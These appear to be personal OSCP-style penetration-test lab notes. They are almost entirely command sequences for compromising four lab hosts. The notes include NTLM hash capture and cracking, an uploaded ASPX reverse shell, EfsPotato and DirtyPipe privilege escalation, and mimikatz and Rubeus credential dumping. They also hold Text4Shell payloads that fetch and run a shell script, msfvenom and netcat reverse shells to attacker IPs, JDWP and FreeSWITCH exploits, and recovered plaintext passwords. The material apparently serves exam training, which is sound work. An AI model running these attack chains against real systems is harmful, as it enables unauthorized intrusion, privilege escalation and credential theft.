```
nmap 192.168.194.147 192.168.194.149-151
```

.147
```
nmap -sT -A MS01.oscp.exam
whatweb MS01.oscp.exam:8080
whatweb MS01.oscp.exam:8000

# due to the proxy, we cannot do anything with the IP:8080 (400 error), so get the DNS name from the output of nmap (8443 port shows cert dns name) and create a hostfile entry for it
gobuster dir -u http://MS01.oscp.exam:8000 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --url http://MS01.oscp.exam:8080/home --filter-status=200

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://MS01.oscp.exam/mvc/FUZZ

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.194.147

enum4linux -n 192.168.194.147

nmap --script=smb-enum* --script-args=unsafe=1 -T5 192.168.194.147
smbclient -p 5040 -L 192.168.194.147

nmap 192.168.194.147 --script=msrpc-enum

nbtstat -a 192.168.194.147

# we find that the url param seems to be vulerable to some sort of file inclusion vuln - cannot get shells from them though
curl -X POST --data 'name=test&mail=test@test.com&url=http://192.168.45.219/cmdasp.aspx' http://MS01.oscp.exam:8080/home/signup

curl -X POST --data "name=test&mail=test@test.com&url=data://text/plain,<?php%20echo%20system('ls');?>" http://MS01.oscp.exam:8080/home/signup


# NOTE: this is an option if you see a url or similar input field
# capture hashes for authenticating by inputting \\192.168.45.219\smb\test.txt into the url field of the form. Then submit the form and watch requests come through with the NTLM hash
sudo impacket-smbserver -smb2support smb smb

#obtain and paste entire thing into a file to crack
web_svc::OSCP:aaaaaaaaaaaaaaaa:3199a5b6dcd4372f1b0723d818b89db8:0101000000000000005829608328da014631744e9608a28b000000000100100049007000650050004100460047006400030010004900700065005000410046004700640002001000680074006c0068006f0052006c00570004001000680074006c0068006f0052006c00570007000800005829608328da0106000400020000000800300030000000000000000000000000300000aca6e088ddb6bd5237f6e791173af27069540d515a100b21569a5cf7198c0cd80a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310039000000000000000000
90CCE81CD3110E1140B4ABDC12271F25
# can also use responder for this - HAS TO LISTEN on VPN interface
# responds to smb requests (be in smb dir)
sudo responder -I tun0

# crack the hash - got Diamond1
hashcat -m 5600 web_svc3.hash /usr/share/wordlists/rockyou.txt --force --show

# try using the password to get a shell
ssh web_svc@192.168.194.147

iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# can write some exe in here C:\inetpub\pportal\bin\roslyn\ but other than that nothing much as we have no privs

# try ftp login
ftp web_svc@192.168.194.147
# we discover a wwwroot meaning we can upload files there. from earlier enumeration we realize that this is for the webserver running on 8000 so we upload a shell
wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
put shell.aspx
# we then go catch the shell on 1234 and now it seems we have higher privs including seImpersonate so we can try some potatoes

cd C:\windows\temp
iwr -uri http://192.168.45.219/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs

iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe

.\efspotato.exe whoami
.\efspotato.exe "nc.exe 192.168.45.219 5555 -e cmd"

```

.147 post exploitation
```
iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# Administrator - 3c4495bbd678fac8c9d218be4f2bbc7b - December31
# maybe - IIS - 9194a08e85de5643bd6a4e5c989d169d
# mary.williams - d9358122015c5b159574a88b3c0d2071 - Freedom1
# support - d9358122015c5b159574a88b3c0d2071

hashcat -m 1000 mw.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

impacket-smbserver -smb2support smb smb 

# does not connect to ldap
iwr -uri http://192.168.45.219:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:/windows/temp

net use \\192.168.45.219\smb
copy 20231206153018_BloodHound.zip \\192.168.45.219\smb

# start bloodhound from kali
bloodhound

# mysql_service is kerberoastable
iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
copy hashes.kerberoast \\192.168.45.219\smb

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule1 --force

# sql_svc - Dolphin1
```
.149
```
wget https://github.com/superkojiman/onetwopunch/raw/master/onetwopunch.sh
nmap -sT -A -p 21,22,80 192.168.211.149
sudo ./onetwopunch.sh -t lab2/149.txt tcp

# UDP ports
sudo nmap 192.168.211.149 -sU -p 1-1000
sudo nmap -sU --open -p 161 192.168.211.149

# 80,21,22 open, udp 161

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.211.149

# format of wordlist is user:password, so use -C option
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.211.149 ftp

# source /usr/share/sparta/wordlists/ftp-default-userpass.txt 
hydra -s 21 -C ftp-wordlist.txt 192.168.211.149 ftp

nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN ftp 192.168.211.149

# enumerate webserver
nikto -host 192.168.211.149
sudo nmap -O 192.168.211.149 --osscan-guess
sudo nmap --script http-enum 192.168.211.149
whatweb http://192.168.211.149
gobuster dir -u http://192.168.211.149 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --url http://192.168.211.149 --filter-status=200,301,403
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/apache.txt --url http://192.168.211.149 --filter-status=200,301,403
feroxbuster --url http://192.168.211.149/icons --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt

gobuster dir -u http://192.168.211.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

# enumerate snmp
sudo apt-get install snmp-mibs-downloader
snmp-check 192.168.211.149 -c public
snmpwalk -c public -v1 -t 10 192.168.211.149
snmpwalk -c public -v2c -t 10 192.168.211.149

# need to do this to get the usernames john and kiero
# then try combos of john and kiero against the ftp server, wordlists don't work
snmpwalk -c public -v1 -t 10 192.168.211.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
nmap --script "snmp* and not snmp-brute" 192.168.211.149

hydra -l kiero -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 192.168.211.149 ftp

hydra -l kiero -P probable-v2-top12000.txt 192.168.211.149 ftp

```

.149 privesc
```
scp -i id_rsa linpeas.sh john@192.168.211.149:/home/john

# get linux kernel version
uname -a
# discover 5.9.0-050900-generic and look up "linux kernel 5.9.0"
# find this: https://www.exploit-db.com/exploits/50808
# end up getting a different script that kind of works - https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c

# create exploit files and copy to container root 
sudo su -
cd /home/kali/lab2
cp exploit.c /var/lib/machines/xen-test/root/

cd /var/lib/machines/xen-test/root
sudo systemd-nspawn -M xen-test

# compile exploit in container

gcc -o exploit exploit.c

# copy back to lab folder
cp exploit /home/kali/lab2/

scp -i id_rsa exploit john@192.168.211.149:/home/john
```

.150
```
nmap 192.168.190.150
nmap -sT -A -p 22,8080 192.168.190.150
nmap -p 1000-10000 192.168.211.150
nikto -host 192.168.211.150 -port 8080
sudo nmap -O 192.168.211.150 --osscan-guess
sudo nmap -sU --open -p 161 192.168.190.150
sudo nmap -sV -p 8080 --script "vuln" 192.168.190.150

whatweb http://192.168.211.150:8080
gobuster dir -u http://192.168.211.150 -w /usr/share/wordlists/dirb/common.txt

# want to look for words and directories in addition to common ones - this finds CHANGELOG - find Apache Commons Text 1.8 vuln 
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.190.150:8080
gobuster dir -u http://192.168.211.150:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

ssh -i id_rsa john@192.168.190.150

# text4 shell https://github.com/kljunowsky/CVE-2022-42889-text4shell
# exploit - since there is no output, try pinging, that works
# in burp: http://192.168.190.150:8080/search?query=id

sudo tcpdump -i tun0 proto \\icmp
${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c3 192.168.45.234')}

# this produces shell code
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh

# this produces a bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=4444 -f raw -o shell.sh

# use burp repeater to download then execute the shell
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('wget%20192.168.45.234%2Fshell.sh%20-O%20/dev/shm/shell.sh')%7D

%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('bash%20/dev/shm/shell.sh')%7D

```
.150 privesc
```
ss -ntplu
# find an internal webserver on port 8000

wget http://192.168.45.234/linpeas.sh -O linpeas.sh
# find writable dir
/tmp/tomcat.14288260503985590587.8080
/tmp/tomcat.14288260503985590587.8080/work/Tomcat/localhost/ROOT
# we find jdwp from linpeas and easily search for exploit against it. also need to look in /opt to see the java files and determine the port needed to trigger the explloit

# try to access internal web server running at 127.0.0.1:8000
chisel server --port 8081 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
wget http://192.168.45.234/chisel -O chisel

# access the internal webpage at 127.0.0.1:8001 - actually cannot access the webpage but the exploit will still work
./chisel client 192.168.45.234:8081 R:8000:0.0.0.0:8000

# jdwp exploit: https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol

python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.234 1234 -e /bin/bash"
# trigger with 
nc 127.0.0.1 5000
```

.151
```
nmap 192.168.190.151
nmap -sT -A -p 80,3389,8021 192.168.190.151
nmap -p 1000-10000 192.168.190.150
nikto -host 192.168.190.151 -port 80
sudo nmap -O 192.168.190.150 --osscan-guess
sudo nmap -sU --open -p 161 192.168.190.151
sudo nmap -sV -p 80 --script "vuln" 192.168.190.151

feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.190.151:80
gobuster dir -u http://192.168.211.151 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --url http://192.168.190.151

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.190.151

# format of wordlist is user:password, so use -C option
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.190.151 ftp -s 8021

# from nmap we discover that there's some interesting text so google for that - reeswitch-event FreeSWITCH mod_event_socket
# find exploit: https://www.exploit-db.com/exploits/47799
searchsploit -m 47799
python3 47799.py 192.168.190.151 whoami 
python3 47799.py 192.168.190.151 "busybox nc 192.168.45.234 1234 -e /bin/bash"

```